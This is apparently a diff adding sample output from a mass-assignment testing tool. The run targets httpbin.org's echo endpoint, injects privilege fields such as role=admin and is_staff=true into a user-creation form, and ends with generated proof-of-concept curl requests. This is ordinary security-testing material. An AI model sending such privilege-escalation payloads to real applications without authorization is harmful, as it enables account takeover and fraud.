@@ -1,0 +1,28 @@
+# python3 cli.py --curl "curl -X POST 'https://httpbin.org/anything/users' -d 'name=bob&email=bob@example.com'" --fields "role=admin,is_staff=true,credit=99999"
+
+target: POST https://httpbin.org/anything/users
+body kind: form
+fields under test: 3
+
+► sending baseline create...
+  └─ 200  509B  437ms
+  └─ no id extracted (pattern: "id"\s*:\s*"?([^",}\s]+))
+
+▷ role=admin  →  200  531B  396ms
+  └─ echoed in CREATE response
+▷ is_staff=true  →  200  534B  464ms
+  └─ echoed in CREATE response
+▷ credit=99999  →  200  533B  363ms
+  └─ echoed in CREATE response
+
+>> PoC curls for 3 stuck field(s)
+............................................................
+>> role=admin  (create)
+   curl -X POST https://httpbin.org/anything/users -H 'Content-Type: application/x-www-form-urlencoded' -d 'name=bob&email=bob@example.com&role=admin'
+
+>> is_staff=true  (create)
+   curl -X POST https://httpbin.org/anything/users -H 'Content-Type: application/x-www-form-urlencoded' -d 'name=bob&email=bob@example.com&is_staff=true'
+
+>> credit=99999  (create)
+   curl -X POST https://httpbin.org/anything/users -H 'Content-Type: application/x-www-form-urlencoded' -d 'name=bob&email=bob@example.com&credit=99999'
+
